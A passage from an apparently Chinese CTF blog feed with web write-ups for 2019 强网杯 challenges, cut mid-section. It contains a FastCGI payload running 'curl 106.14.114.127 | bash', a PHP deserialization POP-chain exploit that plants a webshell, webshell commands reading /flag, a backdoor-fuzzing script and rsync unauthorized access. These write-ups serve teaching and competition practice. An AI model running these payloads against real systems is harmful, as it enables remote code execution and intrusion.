urldecode(&quot;%01%01%1C%AE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%1C%AE%01%DC%00%00%0E%02CONTENT_LENGTH51%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%17PHP_ADMIN_VALUEextension%20%3D%20/tmp/sky.so%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%1C%AE%00%00%00%00%01%05%1C%AE%003%00%00%3C%3Fphp%20hello_world%28%27curl%20106.14.114.127%20%7C%20bash%27%29%3B%20%3F%3E%01%05%1C%AE%00%00%00%00&quot;);stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); &#125;fclose($fp);//&apos;</span><br></pre></td></tr></table></figure></p><p>即可getshell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;鸽了好久的Blog，因为自己事务缠身，一直没时间写一下最近比赛的题解，趁近日有空，来填坑~&lt;br&gt;第一次参加0ctf新星赛就拿了冠军，还是非
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 强网杯online Web Writeup</title>
    <link href="http://skysec.top/2019/05/25/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFonline-Web-Writeup/"/>
    <id>http://skysec.top/2019/05/25/2019-强网杯online-Web-Writeup/</id>
    <published>2019-05-25T07:00:37.000Z</published>
    <updated>2019-05-27T23:56:53.363Z</updated>
    
    <content type="html"><![CDATA[<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>登入题目，首先纵览题目功能，发现有注册和登录：<br><img src="/images/2019-05-25-15-05-13.png" alt=""><br>随便注册登入后，来到文件上传页面：<br><img src="/images/2019-05-25-15-06-24.png" alt=""><br>经探测，发现可以上传png图片,同时上传目录可直接访问：<br><img src="/images/2019-05-25-15-06-50.png" alt=""><br>同时发现cookie有序列化内容：<br><img src="/images/2019-05-25-15-07-23.png" alt=""><br>解码后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:23;s:8:&quot;username&quot;;s:13:&quot;fuck@fuck.com&quot;;s:5:&quot;email&quot;;s:13:&quot;fuck@fuck.com&quot;;s:8:&quot;password&quot;;s:32:&quot;abf753db781ecf27d7b5c9073880ec86&quot;;s:3:&quot;img&quot;;N;&#125;</span><br></pre></td></tr></table></figure></p><p>上传png后，序列化变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:23;s:8:&quot;username&quot;;s:13:&quot;fuck@fuck.com&quot;;s:5:&quot;email&quot;;s:13:&quot;fuck@fuck.com&quot;;s:8:&quot;password&quot;;s:32:&quot;abf753db781ecf27d7b5c9073880ec86&quot;;s:3:&quot;img&quot;;s:79:&quot;../upload/9862a5f0c459c3f78ba4bab12279ea3d/fb5c81ed3a220004b71069645f112867.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>尝试直接改序列化进行目录穿越<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:23;s:8:&quot;username&quot;;s:13:&quot;fuck@fuck.com&quot;;s:5:&quot;email&quot;;s:13:&quot;fuck@fuck.com&quot;;s:8:&quot;password&quot;;s:32:&quot;abf753db781ecf27d7b5c9073880ec86&quot;;s:3:&quot;img&quot;;s:28:&quot;../../../../../../etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>页面直接跳转至登录页面，猜测不能直接修改序列化内容。<br>根据以往经验，有序列化一般都有源码泄露，否则序列化很难恶意构造，于是探测目录，得到文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.66.242:32147/www.tar.gz</span><br></pre></td></tr></table></figure></p><p>审计网站源码，将目光定位到如下3个文件上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web/controller/Index.php</span><br><span class="line">web/controller/Profile.php</span><br><span class="line">web/controller/Register.php</span><br></pre></td></tr></table></figure></p><p>在<code>web/controller/Profile.php</code>看到关键函数操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp))&#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>其中操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp))&#123;</span><br><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br></pre></td></tr></table></figure></p><p>跟进<code>$this-&gt;filename_tmp</code>和<code>$this-&gt;filename</code>,发现没有过滤等限制，唯一阻碍：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但我们可以通过直接GET请求，不进入该if判断。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同时该校验也可如法炮制，可直接通过设置类中属性进行bypass，不进入if判断。<br>到此为止可得到类的部分构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> $filename_tmp=<span class="string">'../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/5d0f060446d095e20383edb9e61bd156.png'</span>;</span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">'../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php'</span>;</span><br></pre></td></tr></table></figure></p><p>(注：该处路径是<code>../public/upload/</code>，从代码<code>@chdir(&quot;../public/upload&quot;);</code>可发现，一开始我被坑了= =)<br>当该值进入upload_img函数后，即可利用copy成功复制出php文件。但是新的问题来了，如何通过反序列化直接调用upload_img函数。<br>这里可以看到两个魔法方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们知道当对象调用不可访问属性时，就会自动触发<strong>get魔法方法，而在对象调用不可访问函数时，就会自动触发</strong>call魔法方法。<br>那么寻找触发方式可以发现文件<code>web/controller/Register.php</code>，关键部分如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们可以看到checker调用了类Index里的方法index()，如果我们此时将checker的<strong>construct覆盖为类Profile，那么势必在调用index()方法时，会触发</strong>call函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而进入该函数后，我们会触发<code>$this-&gt;index</code>,成功尝试调用类Profile中不存在的对象，于是可触发__get魔法方法，从而变成<code>return $this-&gt;except[&#39;index&#39;];</code>，那么我们只要在构造序列化时，将except赋值为数组，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br></pre></td></tr></table></figure></p><p>即可在类Register进行__destruct()时，成功触发upload_img函数，进行文件复制和改名。<br>综合上述pop链，我们可以构造如下exp:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/5d0f060446d095e20383edb9e61bd156.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br></pre></td></tr></table></figure></p><p>成功改名后可直接getshell，进行命令执行：<br><img src="/images/2019-05-25-15-30-55.png" alt=""><br>进行getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://49.4.66.242:32147/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php?sky=system(%27ls%27);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-33-35.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://49.4.66.242:32147/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php?sky=system(%27ls%20/%27);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-33-58.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://49.4.66.242:32147/upload/9862a5f0c459c3f78ba4bab12279ea3d/sky.php?sky=system(%27cat%20/flag%27);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-34-24.png" alt=""></p><h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><p><img src="/images/2019-05-25-15-34-55.png" alt=""><br>题目直接提供了源码下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.48.182:31784/www.tar.gz</span><br></pre></td></tr></table></figure></p><p>下载后发现是3000多个混淆过的shell，其中包括多种障眼法：<br><img src="/images/2019-05-25-15-35-59.png" alt=""><br><img src="/images/706CA7490B0918EB26FE6AD941437F24.jpg" alt=""><br>例如看起来可进行RCE的参数，实际上被置空，或者有根本不可能进入的if判断。这让我们寻找可用的后门非常困难。<br>此时有两种想法，一种为动态调试，另一种为fuzz。考虑到便捷性，我使用了后者，思路如下:<br>匹配出所有$_GET或者$_POST参数，然后统一赋值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;sky cool&apos;;</span><br></pre></td></tr></table></figure></p><p>如果回显中包含sky cool，那么证明该文件为可用shell，于是撰写如下脚本：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">"http://localhost:8888/src/"</span></span><br><span class="line">base_dir = <span class="string">"/Desktop/site/src/"</span></span><br><span class="line">file_list = [<span class="string">'zzt4yxY_RMa.php'</span>,........ <span class="string">'m_tgKOIy5uj.php'</span>, <span class="string">'aEFo52YSPrp.php'</span>, <span class="string">'Hk3aCSWcQZK.php'</span>, <span class="string">'RXoiLRYSOKE.php'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extracts</span><span class="params">(f)</span>:</span></span><br><span class="line">    gets = []</span><br><span class="line">    <span class="keyword">with</span> open(base_dir + f, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        lines = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> lines]</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> line.find(<span class="string">"$_GET['"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                start_pos = line.find(<span class="string">"$_GET['"</span>) + len(<span class="string">"$_GET['"</span>)</span><br><span class="line">                end_pos = line.find(<span class="string">"'"</span>, start_pos)                </span><br><span class="line">                gets.append(line[start_pos:end_pos])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gets</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(start,end)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">filename = file_list[i]</span><br><span class="line">gets = extracts(filename)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"try: %s"</span>%filename </span><br><span class="line"><span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">now_url = <span class="string">"%s%s?%s=%s"</span>%(base_url,filename,get,<span class="string">'echo "sky cool";'</span>)</span><br><span class="line">r = requests.get(now_url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'sky cool'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">print</span> now_url</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"%s~%s not found!"</span>%(start,end)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pool = Pool(processes=<span class="number">15</span>)    <span class="comment"># set the processes max number 3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(file_list),len(file_list)/<span class="number">15</span>):</span><br><span class="line">        pool.apply_async(exp,(i,i+len(file_list)/<span class="number">15</span>,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>运行后找到文件：<br><img src="/images/2019-05-25-16-38-26.png" alt=""><br>进行getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://117.78.48.182:31784/xk0SzyKwfzw.php?Efa5BVG=ls%20/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-58-01.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://117.78.48.182:31784/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-25-15-57-50.png" alt=""></p><h2 id="babywebbb"><a href="#babywebbb" class="headerlink" title="babywebbb"></a>babywebbb</h2><p>直接访问题目：<br><img src="/images/2019-05-26-16-19-37.png" alt=""><br>得到信息，发现有证书信任问题。尝试进行信息搜集，找到ip对应的域名：<br><img src="/images/2019-05-26-16-21-57.png" alt=""><br>发现可疑子域名，进行/etc/hosts绑定：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49.4.71.212 qqwwwwbbbbb.52dandan.xyz</span><br></pre></td></tr></table></figure></p><p>访问页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/</span><br></pre></td></tr></table></figure></p><p>发现现在正常访问，但是页面404。进行信息搜集，扫端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">22/tcp    open   ssh</span><br><span class="line">873/tcp   open   rsync</span><br><span class="line">3389/tcp  closed ms-wbt-server</span><br><span class="line">8080/tcp  closed http-proxy</span><br><span class="line">8088/tcp  open   radan-http</span><br><span class="line">12345/tcp closed netbus</span><br><span class="line">31337/tcp closed Elite</span><br></pre></td></tr></table></figure></p><p>发现837端口开放，尝试未授权访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync 49.4.71.212::</span><br><span class="line">rsync 49.4.71.212::&quot;src&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-16-25-33.png" alt=""><br>下载backup_old.zip<br><img src="/images/2019-05-26-16-26-08.png" alt=""><br>获得外网源码，审计一波，发现是用flask写的小站，首先看下路由：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.register_blueprint(admin, url_prefix=<span class="string">'/admin'</span>)</span><br><span class="line">app.register_blueprint(graphql, url_prefix=<span class="string">'/graphql_test123'</span>)</span><br><span class="line">app.register_blueprint(login_blue, url_prefix=<span class="string">'/user'</span>)</span><br><span class="line">app.register_blueprint(user, url_prefix=<span class="string">'/user'</span>)</span><br></pre></td></tr></table></figure></p><p>同时看到登录页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://qqwwwwbbbbb.52dandan.xyz:8088/user/login</span><br></pre></td></tr></table></figure></p><p>审计相关代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9]*$"</span>, username):</span><br><span class="line">    sql = <span class="string">"select * from user where username_which_you_do_not_know=\"&#123;&#125;\" and password_which_you_do_not_know_too=\"&#123;&#125;\""</span>.format(username,password_new)</span><br></pre></td></tr></table></figure></p><p>发现有过滤，且有功能需要登录<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@user.route('/newimg', methods=['POST','GET'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    url = unquote(request.form.get(<span class="string">'newurl'</span>))</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[A-Za-z0-9-_%:./]*$"</span>,url):</span><br><span class="line">        filename = ramdom_str()</span><br><span class="line">        command = <span class="string">"curl &#123;&#125; &gt; /tmp/&#123;&#125;"</span>.format(url, filename)</span><br><span class="line">        os.system(command)</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"/tmp/&#123;&#125;"</span>.format(filename),<span class="string">"rb"</span>) <span 